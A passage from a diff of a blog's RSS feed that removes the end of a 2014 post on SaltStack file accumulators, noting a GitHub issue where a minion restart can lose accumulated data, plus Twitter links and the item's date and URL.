-If you use accumulators you may need to subscribe on this &lt;a href=&quot;https://github.com/saltstack/salt/issues/8881&quot;&gt;reload_module vs accumulated issue&lt;/a&gt; on github. It's a quite general issue, but this actually prevents using accumulators on states with too much &lt;em&gt;distance&lt;/em&gt;, as you may loose the accumulated data if something restarted the minion while your states are running.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/p&gt;
-</description>
-				<published>2014-01-27 00:00:00 +0100</published>
-				<link>http://regilero.github.io/saltstack/english/2014/01/27/saltstack_use_file_accumulated_accumulators_with_file_managed_and_file_blockreplace/</link>
 			</item>
 		
 	</channel>
